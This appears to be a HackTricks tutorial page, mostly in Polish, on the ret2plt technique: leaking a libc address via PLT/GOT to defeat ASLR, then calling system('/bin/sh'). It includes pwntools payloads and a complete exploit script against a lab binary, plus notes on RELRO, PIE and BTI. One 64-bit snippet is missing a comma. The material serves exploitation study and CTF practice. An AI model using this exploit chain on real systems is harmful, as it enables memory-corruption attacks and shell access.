# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Podstawowe informacje

Celem tej techniki jest **leak adresu funkcji z PLT**, aby móc obejść ASLR. Dzieje się tak, ponieważ jeśli na przykład leak adresu funkcji `puts` z libc zostanie ujawniony, możesz wtedy **obliczyć, gdzie znajduje się baza `libc`** i wyliczyć offsety, by uzyskać dostęp do innych funkcji, takich jak **`system`**.

Można to zrobić za pomocą payloadu `pwntools` takiego jak ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Zauważ, że **`puts`** (używając adresu z PLT) jest wywoływany z adresem `puts` znajdującym się w GOT (Global Offset Table). Dzieje się tak, ponieważ w momencie, gdy `puts` wypisze wpis GOT dla puts, ten **wpis będzie zawierał dokładny adres `puts` w pamięci**.

Zwróć też uwagę, że w exploicie używany jest adres `main`, więc gdy `puts` zakończy wykonanie, **plik binarny wywoła `main` ponownie zamiast zakończyć działanie** (więc leaked address będzie nadal ważny).

> [!CAUTION]
> Zauważ, że aby to działało **plik binarny nie może być skompilowany z PIE** lub musisz **znaleźć leak, aby obejść PIE** aby znać adres PLT, GOT i main. W przeciwnym razie musisz najpierw obejść PIE.

Możesz znaleźć [**pełny przykład tego bypassu tutaj**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). To był końcowy exploit z tego **przykładu**:

<details>
<summary>Full exploit example (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Współczesne uwagi

- **`-fno-plt` builds** (częste w nowoczesnych dystrybucjach) zastępują `call foo@plt` przez `call [foo@got]`. Jeśli binarka nie ma stubu `foo@plt`, you can still leak the resolved address with `puts(elf.got['foo'])` i następnie **return directly to the GOT entry** (`flat(padding, elf.got['foo'])`) aby skoczyć do libc po zakończeniu lazy binding.
- **Full RELRO / `-Wl,-z,now`**: GOT jest tylko do odczytu, ale ret2plt wciąż działa, ponieważ czytasz tylko slot GOT. Jeśli symbol nigdy nie był wywołany, twój pierwszy ret2plt również wykona lazy binding i potem wydrukuje wypełniony slot.
- **ASLR + PIE**: jeśli PIE jest włączone, najpierw leak a code pointer (np. saved return address, function pointer, lub `.plt` entry via another format‑string/infoleak) aby obliczyć bazę PIE, następnie zbuduj ret2plt chain z rebased PLT/GOT addresses.
- **Non‑x86 architectures with BTI/PAC (AArch64)**: PLT entries są ważnymi BTI landing pads (`bti c`), więc przy exploicie na binarkach z BTI włączonym preferuj skok do PLT stub (albo innego BTI‑annotated gadget) zamiast bezpośrednio do libc gadget bez BTI — w przeciwnym razie CPU zgłosi `BRK`/`PAC` failures.
- **Quick resolution helper**: jeśli docelowa funkcja nie jest jeszcze resolved i potrzebujesz leak w jednym strzale, odpal wywołanie PLT dwukrotnie: najpierw `elf.plt['foo']` (to resolve), potem znowu `elf.plt['foo']` z adresem GOT jako argument, aby wydrukować teraz‑wypełniony slot.

## Other examples & References

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled but no PIE, pierwszy krok to wypełnić overflow aż do bajtu 0x00 canary, by potem wywołać puts i leak it. Mając canary tworzy się ROP gadget do wywołania puts by leak the address of puts from the GOT, a następnie ROP gadget do wywołania `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR enabled, no canary, stack overflow in main from a child function. ROP gadget to call puts to leak the address of puts from the GOT and then call an one gadget.

## References

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
